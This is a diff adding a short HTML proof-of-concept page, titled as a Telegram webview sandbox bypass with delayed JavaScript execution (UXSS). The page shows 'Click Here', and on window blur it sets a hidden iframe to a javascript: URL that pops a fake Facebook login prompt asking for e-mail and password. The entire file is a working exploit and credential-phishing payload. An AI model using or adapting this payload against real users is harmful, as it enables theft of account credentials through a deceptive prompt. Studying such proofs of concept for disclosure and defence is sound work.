@@ -1,0 +1,28 @@
+<html lang="en-US">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, user-scalable=no">
+	<title> Bypass sandbox Webview UXss Delayed JavaScript execution leak to host app (Telegram)</title>
+	
+	<style>
+		iframe {
+			visibility: hidden;
+		}
+	</style>
+   
+	<script>
+		window.onblur = function() {
+			document.getElementById("iframe").src = "javascript:prompt('In order to access facebook.com\\nyou must first login on your\\nFacebook Account.\\n\\nPlease type your e-mail\\nand your password:\\n', 'E-mail / Password.');";
+		}
+	</script>
+</head>
+
+<body>
+   <center>
+		<br>
+		<h1>Click Here</h1>
+	</center>
+   <iframe id="iframe"></iframe>
+</body>
+
+</html>
